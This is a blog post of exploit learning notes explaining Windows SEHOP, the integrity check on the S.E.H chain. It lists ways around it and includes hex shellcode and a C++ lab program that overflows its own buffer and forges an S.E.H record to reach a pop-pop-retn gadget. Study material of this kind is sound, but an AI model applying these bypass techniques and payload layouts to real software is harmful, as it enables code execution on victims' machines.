---
title: Exploit learning notes 020 SEHOP introduction
description: Introduction to SEHOP and a little simple attack
date: 2020-11-28 15:38:00+0800
categories:
    - Exploit
tags:
    - Windows
    - SEHOP
---

Source: [Moeomu's blog](/posts/exploit-learning-notes-020-sehop-introduction/)

## Introduction

The core task of SEHOP is to check the integrity of the S.E.H chain. Before the program turns to exception handling SEHOP checks whether the last exception handling function on the S.E.H chain is the ultimate exception handling function fixed by the system. If yes, it means this S.E.H chain is not broken and the program can go to execute the current exception handling function; if it detects that the last exception handling function is not, it means the S.E.H chain is broken and an S.E.H override attack may have occurred and the program will not go to execute the current exception handling function

> SEHOP validation pseudocode

```cpp
if (process_flags & 0x40 == 0)  // 如果没有SEH记录则不进行检测
{
    if (record != 0xFFFFFFFF)  // 开始检测
    {
        do
        {
            if (record < stack_bottom || record > stack_top) // SEH 记录必须位于栈中
                goto corruption;
            if ((char *)record + sizeof(EXCEPTION_REGISTRATION) > stack_top) // SEH 记录结构需完全在栈中
                goto corruption;
            if ((record & 3) != 0) // SEH记录必须4字节对齐
                goto corruption;
            handler = record->handler;
            if (handler >= stack_bottom && handler < stack_top) // 异常处理函数地址不能位于栈中
                goto corruption;
            record = record->next;
        } while (record != 0xFFFFFFFF); // 遍历S.E.H链
    }
    if ((TEB->word_at_offset_0xFCA & 0x200) != 0)
    {
        if (handler != &FinalExceptionHandler) // 核心检测，地球人都知道，不解释了
        goto corruption;
    }
}
```

## Attack ideas

### Attack the return address

> If the function has SEHOP enabled but not GS enabled or if the function does not have GS enabled, then directly attack the return address

### Attack the virtual function

> SEHOP only protects SEH, but it does not protect the dummy function table, so the attack on the dummy function can still be successful

### Exploit modules that do not have SEHOP enabled

> Microsoft has disabled SEHOP for some encryption shells, e.g. Armadilo

- For example, we can set these two options to `0x53` and `0x52` respectively to simulate a program that has been shelled by `Armadilo`, so as to Disable SEHOP
- In Windows 7 and later, the second module pointed to by `PEB_LDR_DATA` is occupied by `KernelBase.dll`, so the shellcode should be changed

```c
Shellcode_for_windows7=
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09"
"\x8B\x09" // 在这增加机器码\x8B\x09，它对应的汇编为mov ecx,[ecx]
"\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
;
```

### Fake SEH chain table

> Prerequisite: ASLR is not enabled

- Idea
  - Bypass `SafeSEH` by using `SEH_NOSafeSEH_JUMP.dll` which is not `SafeSEH` enabled
  - Bypass `SEHOP` by forging the S.E.H chain to create the illusion that the S.E.H chain is not broken
  - The test function in `SEH_NOSafeSEH` has a typical overflow, i.e., it causes a str overflow by copying an extra-long string to str, which in turn overwrites the program's S.E.H information
  - Use the `pop pop retn` instruction address in `SEH_NOSafeSEH_JUMP.DLL` to overwrite the address of the exception handling function, and then transfer the program to exception handling by creating a divide-by-0 exception
  - By hijacking the exception handling process, the program is transferred to `SEH_NOSaeSEH_JUMP.DLL` to execute the `pop pop retn` instruction, and after executing `retn` the program is transferred to `shellcode` for execution.

- Code

```cpp
#include <string.h>
#include <windows.h>

char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x14\xFF\x12\x00" // address of last seh record
"\x12\x10\x12\x11" // address of pop pop retn in No_SafeSEH module
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09"
"\x8B\x09" // 在这增加机器码\x8B\x09，它对应的汇编为mov ecx,[ecx]
"\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90"
"\xFF\xFF\xFF\xFF" // the fake seh record
"\x75\xA8\xF7\x77"
;

DWORD MyException(void)
{
    printf("There is an exception");
    getchar();
    return 1;
}

void test(char * input)
{
    char str[200];
    memcpy(str, input, 412);
    int zero = 0;
    __try
    {
        zero = 1 / zero;
    }
    __except(MyException()){}
}

int main()
{
    HINSTANCE hInst = LoadLibrary(_T("SEH_NOSaeSEH_JUMP.dll")); // load No_SafeSEH module
    char str[200];
    test(shellcode);
    return 0;
}
```
